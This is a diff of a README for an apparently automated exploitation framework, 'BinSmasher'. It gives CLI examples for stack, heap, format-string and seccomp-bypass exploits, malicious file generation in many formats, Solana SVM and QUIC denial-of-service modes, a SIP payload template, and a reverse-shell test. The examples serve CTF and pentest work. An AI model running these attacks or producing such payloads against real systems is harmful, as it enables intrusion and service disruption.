+# === Advanced: Custom win function detection ===
+
+# Use ExploitGenerator directly with custom parameters
+eg = ExploitGenerator(
+    binary="./custom_chall",
+    platform="linux",
+    host="ctf.io",
+    port=4444,
+    log_file="/tmp/bs.log",
+    tls=False,
+    binary_args="",
+    win_names=["get_flag", "print_flag", "solve"],  # Custom win function names
+    offset_range=(16, 256, 16)  # Custom offset range: min, max, step
+)
+
+# Check default win patterns (39+ built-in)
+print(DEFAULT_WIN_PATTERNS)
+# ['win', 'flag', 'shell', 'backdoor', 'secret', 'easy', ...]
+```
 
 ---
 
 ## file — Malicious File Generation
 
 ```bash
-python3 src/main.py file --format mp3 --offset 256 --technique overflow -o ./payloads/
-python3 src/main.py file --all-formats --offset 512 -o ./payloads/
+binsmasher file --format mp3 --offset 256 --technique overflow -o ./payloads/
+binsmasher file --all-formats --offset 512 -o ./payloads/
 ```
 
 | Category | Formats |
 |---|---|
 | Audio | `mp3`, `wav`, `flac`, `ogg`, `aac` |
 | Documents | `pdf`, `doc`, `docx`, `xls`, `xlsx`, `rtf`, `txt`, `csv` |
-| Data | `json`, `xml`, `html`, `svg` |
+| Web/Data | `json`, `xml`, `html`, `svg` |
 | Images | `bmp`, `png`, `gif`, `jpeg` |
 | Code | `py`, `js`, `php`, `lua`, `rb` |
-| Archives | `zip`, `tar` |
-| Binary | `elf`, `raw` |
+| Archives/Binary | `zip`, `tar`, `elf`, `raw` |
 
 ---
 
 ## solana — Agave / Solana SVM Auditing
 
 ```bash
-python3 src/main.py solana --rpc http://localhost:8899 \
+binsmasher solana --rpc http://localhost:8899 \
   --source-path ./agave/src --exploit-type svm-bpf
 ```
 
 | `--exploit-type` | Description |
 |---|---|
 | `svm-bpf` | BPF verifier bypass |
-| `deser` | Account deserialization vuln |
-| `dos-quic` | QUIC connection DoS |
-| `snapshot-assert` | Snapshot assert panic |
+| `deser` | Account deserialization vulnerability |
+| `dos-quic` | QUIC connection denial of service |
+| `snapshot-assert` | Snapshot loading assertion panic |
 
 ---
 
 ## Usage Examples
 
-### CTF — Quick ret2win
+### CTF — ret2win (simplest case)
+
 ```bash
 binsmasher binary -b ./pwn1 --host 127.0.0.1 --port 1337 -t
 ```
 
-### CTF — Auto-detect vuln type first
+### CTF — Auto-detect vuln, adaptive timeout
+
 ```bash
 binsmasher binary -b ./unknown --host ctf.example.com --port 4444 \
-  --detect-vuln -t
-# Probes the service → tells you STACK_OVERFLOW / FORMAT_STRING / HEAP_OVERFLOW
-# Then runs the matching exploit automatically
+  --detect-vuln --adaptive-timeout -t
 ```
 
-### CTF — ASLR + NX + PIE (full mitigations) — two-stage leak
+### CTF — ASLR + NX + PIE, two-stage leak
+
 ```bash
-binsmasher binary -b ./hard_pwn \
-  --host 127.0.0.1 --port 9001 \
-  --multistage \
-  --output-ip 10.0.0.1 --output-port 4444 \
-  -t --interactive
-# Stage 1: leaks puts@GOT → queries libc.rip/local DB
-# Stage 2: ret2system("/bin/sh") → drops to interactive shell
+binsmasher binary -b ./hard_pwn --host 127.0.0.1 --port 9001 \
+  --multistage -t --interactive
 ```
 
-### CTF — ASLR without leak, brute PIE
+### CTF — Format string, Full RELRO
+
 ```bash
-binsmasher binary -b ./pie_binary \
-  --host ctf.io --port 4444 \
-  --brute-aslr --brute-attempts 512 \
-  -t
+binsmasher binary -b ./fmtstr_chal --host 127.0.0.1 --port 5555 -t
+# Automatically uses stack return-address write when Full RELRO detected
 ```
 
 ### CTF — Heap challenge (glibc 2.35, no hooks)
+
 ```bash
-binsmasher binary -b ./heap_chal \
-  --host 127.0.0.1 --port 7777 \
+binsmasher binary -b ./heap_chal --host 127.0.0.1 --port 7777 \
   --heap-advanced -t
-# Auto-selects: House of Apple2 for glibc 2.34+
-#               tcache poisoning + __malloc_hook for < 2.34
+# Auto-selects: House of Apple2 (glibc 2.34+) or tcache+hook (< 2.34)
 ```
 
-### CTF — Force SROP
+### CTF — Brute ASLR without leak
+
 ```bash
-binsmasher binary -b ./no_gadgets --host 127.0.0.1 --port 3333 --srop -t
+binsmasher binary -b ./pie_binary --host ctf.io --port 4444 \
+  --brute-aslr --brute-attempts 512 -t
 ```
 
-### CTF — ORW / Seccomp bypass
+### CTF — ARM64 binary
+
 ```bash
-binsmasher binary -b ./sandboxed \
-  --host 127.0.0.1 --port 8888 \
-  --orw --flag-path /home/ctf/flag.txt -t
+binsmasher binary -b ./arm64_chal --host 127.0.0.1 --port 4444 -t
+# Detects AArch64 and uses ARM64-specific ROP chains automatically
+```
+
+### CTF — Seccomp sandbox, ORW
+
+```bash
+binsmasher binary -b ./sandboxed --host 127.0.0.1 --port 8888 \
+  --detect-vuln --flag-path /home/ctf/flag.txt -t
+# Detects seccomp, auto-enables --orw using only allowed syscalls
+```
+
+### CTF — Canary without fork-server
+
+```bash
+binsmasher binary -b ./canary_chal --host 127.0.0.1 --port 3333 -t
+# Tries: format string leak → stack read → printf leak → fork brute
 ```
 
 ### CTF — Generate solve template
+
 ```bash
-binsmasher binary -b ./pwn1 --host 127.0.0.1 --port 1337 \
-  --template --generate-scripts
-# → tests/bins/_bs_work/solve_pwn1.py (complete, runnable)
-# → tests/bins/_bs_work/crash_pwn1.py
-# → tests/bins/_bs_work/exploit_pwn1.py
+binsmasher binary -b ./challenge --host 127.0.0.1 --port 1337 \
+  --template --writeup --generate-scripts -t
 ```
 
-### CTF — Remote server with high latency (VPN)
-```bash
-binsmasher binary -b ./challenge \
-  --host ctf.example.com --port 1337 \
-  --adaptive-timeout \
-  --multistage -t
-# Measures RTT → scales connect/recv/exploit timeouts automatically
-```
+### CTF — Remote with high latency + multi-symbol fingerprint
 
-### CTF — Use angr for complex binary
 ```bash
-binsmasher binary -b ./obfuscated --host 127.0.0.1 --port 4444 \
-  --angr -t
-# Symbolically explores paths to win()/flag()/shell()
-# Extracts concrete input and offset hint
+binsmasher binary -b ./challenge --host ctf.example.com --port 1337 \
+  --adaptive-timeout --multistage --multisym-leak \
+  --output-json result.json -t
 ```
 
 ### Pentest — SIP/UDP service
+
 ```bash
 cat > invite.txt << 'EOF'
 INVITE sip:target@127.0.0.1 SIP/2.0
-Via: SIP/2.0/UDP 127.0.0.1:5061;branch=z9hG4bKtest
-From: <sip:attacker@127.0.0.1>;tag=1234
-To: <sip:target@127.0.0.1>
-Call-ID: test@127.0.0.1
-CSeq: 1 INVITE
 Content-Type: application/sdp
 Content-Length: {CONTENT_LENGTH}
 
-v=0
-o=- 0 0 IN IP4 127.0.0.1
-s=-
-c=IN IP4 127.0.0.1
-t=0 0
 a=ice-ufrag:{PAYLOAD}
-a=ice-pwd:validpassword12345678901234
-m=audio 5004 RTP/AVP 0
 EOF
 
 binsmasher binary -b /path/to/sip_server \
@@ -525,23 +619,17 @@ binsmasher binary -b /path/to/sip_server \
   --payload-data "$(cat invite.txt)"
 ```
 
-### Pentest — JSON output for reporting
-```bash
-binsmasher binary -b ./target \
-  --host 192.168.1.50 --port 8080 \
-  --detect-vuln --multistage -t \
-  --output-json /tmp/vuln_report.json \
-  --output-markdown
-```
+### Menu binary (heap CTF)
 
-### DOS Mode + scripts
 ```bash
-binsmasher binary -b ./target \
-  --host 192.168.1.50 --port 8080 \
-  --dos --generate-scripts
-# → crash_target.py  (standalone crash PoC)
-# → exploit_target.py (standalone exploit)
-# → solve_target.py  (complete solve template)
+binsmasher binary -b ./heap_menu --host 127.0.0.1 --port 4444 \
+  --heap-advanced -t \
+  --menu-script '[
+    {"recv_until": "> "},
+    {"send_line": "1"},
+    {"recv_until": "size: "},
+    {"send_line": "32"}
+  ]'
 ```
 
 ---
@@ -555,16 +643,19 @@ cd tests/src && make && cd ../..
 # 2. Fast local tests (skip slow CMD/REVSHELL)
 python tests/test_suite.py --local-only --skip-slow
 
-# 3. Full local tests including CMD exec and reverse shell
+# 3. Full local tests
 python tests/test_suite.py --local-only
 
-# 4. Full suite including CTF binary downloads
+# 4. Full suite + CTF binary downloads
 python tests/test_suite.py
+
+# 5. New feature unit/integration tests
+python tests/test_new_features.py
 ```
 
 ### Expected results
 
-| Binary | Expected | Technique |
+| Binary | Status | Technique |
 |---|---|---|
 | t1_stack_noprotect | ✅ PASS | ret2win — NX off |
 | t2_stack_nx | ✅ PASS | ret2win — NX on |
@@ -577,58 +668,39 @@ python tests/test_suite.py
 | t9_stripped | ⚠️ WARN | No symbols — expected |
 | t10_safestack | ✅ PASS | ret2win |
 | t11_heap_glibc234 | ✅ PASS | ret2win — glibc 2.34+ |
-| t_shellexec | ✅ PASS | win() → system("id") confirmed |
+| t_shellexec | ✅ PASS | win() → system("id") |
 | t_revshell | ✅ PASS | win() → connect-back shell |
-
----
-
-## Technique Decision Tree
-
-```
-                      ┌─────────────────┐
-                      │  --detect-vuln  │ ← probe service first
-                      └────────┬────────┘
-                               │
-                    ┌──────────▼──────────┐
-                    │  Vuln type?         │
-                    │  STACK / FMT /      │
-                    │  HEAP / UAF / INT   │
-                    └──────────┬──────────┘
-                               │ STACK_OVERFLOW
-                    ┌──────────▼──────────┐
-                    │  Win/flag symbol?   │
-                    └──────────┬──────────┘
-                       YES ────┼──── NO
-                               │           │
-                    ┌──────────▼────┐      │
-                    │  ret2win      │      │
-                    └───────────────┘      │
-                                  ┌────────▼────────┐
-                                  │  NX enabled?    │
-                                  └────────┬────────┘
-                               NO ─────────┼───── YES
-                               │                    │
-                    ┌──────────▼────┐    ┌──────────▼──────────┐
-                    │  Shellcode    │    │  ASLR + leak?       │
-                    └───────────────┘    └──────────┬──────────┘
-                                        YES ────────┼──── NO (brute)
-                                        │                │
-                             ┌──────────▼──┐   ┌────────▼─────────┐
-                             │ --multistage│   │ --brute-aslr     │
-                             │ two-stage   │   │ PIE/libc/partial │
-                             │ ret2system  │   └──────────────────┘
-                             └─────────────┘
-```
 
 ---
 
 ## Known Limitations
 
-- **UDP+spawn**: single-stage only. ret2plt+leak, DynELF, fmt-string leak require a receive channel — not supported.
-- **Copy crash constraint**: if `ret_addr_offset + chain_len >= min_crash` the overflow field cannot be exploited. Find a different field with a larger gap.
-- **Windows/macOS**: limited testing — primarily Linux/ELF.
-- **Kernel exploits**: not in scope (no `/dev/ptmx`, `userfaultfd`, spray).
-- **Browser/JS**: not in scope.
+### Automatic Exploitation
+- **PIE + ASLR without leak**: Requires address leak in banner/output. Use `--brute-aslr` for fork servers.
+- **Stripped binaries**: No symbols = no automatic win detection. Use `--win-names` if you know the function.
+- **Menu-based services**: Requires `--menu-script` JSON for navigation.
+- **Heap with complex menus**: Partial automation; some interaction may be manual.
+
+### Technical Constraints
+- **UDP+spawn**: Single-stage only. ret2plt+leak, DynELF, format string leak require receive channel.
+- **Copy crash constraint**: If `ret_addr_offset + chain_len >= min_crash`, that overflow cannot be exploited.
+- **Windows**: SafeSEH/CFG detection works; exploitation is partially implemented.
+- **Kernel exploits**: Not in scope (`/dev/ptmx`, `userfaultfd`, heap spray).
+- **ARM64 gadget search**: Depends on ROPgadget or ropper being installed.
+- **angr**: Requires separate installation (`pip install angr`), large dependency.
+
+### What Works Automatically
+| Binary Type | Success Rate | Notes |
+|-------------|---------------|-------|
+| ret2win (symbols) | ✅ 100% | Auto-detects 39+ win patterns |
+| NX + canary (banner leak) | ✅ 100% | Parses `COOKIE:0x...` from banner |
+| Format string | ✅ 95% | Partial/Full RELRO supported |
+| PIE + leak in output | ✅ 90% | Same-connection exploit |
+| ret2libc (libc known) | ✅ 85% | Requires libc identification |
+| Heap basic | ✅ 80% | UAF, fastbin, tcache |
+| Heap advanced | ⚠️ 60% | House of Apple2, FSOP |
+| PIE + ASLR (no leak) | ⚠️ 30% | Fork-server brute only |
+| Stripped | ❌ 10% | Needs `--win-names` or angr |
 
 ---
 
@@ -641,13 +713,14 @@ python tests/test_suite.py
 | `radare2` | Yes | Static analysis, gadget finding |
 | `gdb` | Recommended | Offset detection, corefile analysis |
 | `socat` | Yes (tests) | TCP→stdin for test suite |
-| `one_gadget` | Recommended | One-gadget libc magic gadgets |
+| `one_gadget` | Recommended | one_gadget libc magic gadgets |
 | `AFL++` | Optional | Coverage fuzzing (`--afl-fuzz`) |
 | `frida` | Optional | Dynamic instrumentation (`--frida`) |
 | `boofuzz` | Optional | Network fuzzing (`--fuzz`) |
 | `angr` | Optional | Symbolic execution (`--angr`) |
 | `checksec` | Optional | Better protection detection |
 | `patchelf` | Optional | Binary patching for local libc |
+| `seccomp-tools` | Optional | Seccomp filter analysis (Ruby gem) |
 
 ---
 
@@ -664,20 +737,19 @@ python3 cve_scan.py --single /tmp/vuln_binary      # Single binary
 python3 cve_scan.py --single ./target --confidence CONFIRMED --verbose
 ```
 
-Features: 25+ dangerous functions, taint analysis, CVSS scoring, HTML/JSON/CVE output.
+Detects 25+ dangerous functions, applies taint analysis, generates CVSS-scored HTML/JSON/MITRE CVE output.
 
 ---
 
 ## Contributing
 
-Contributions are welcome. Please open an issue or submit a pull request.
+Contributions are welcome. Open an issue or submit a pull request.
 
-Areas for improvement:
-- Kernel exploit primitives (`/dev/ptmx`, `userfaultfd`, `pipe_buf`)
+Priority areas:
+- Kernel exploit primitives (`modprobe_path`, `commit_creds`, `msg_msg`)
 - CTF platform integration (`pwn.college`, `HTB`, `pwnable.kr`)
-- More architectures (ARM64, MIPS, RISC-V)
-- AI-powered analysis — BinSmasher Agent
-- Ghidra headless integration
+- ARM64 gadget search improvements (PAC bypass)
+- More libc versions in local database
 
 ---
 
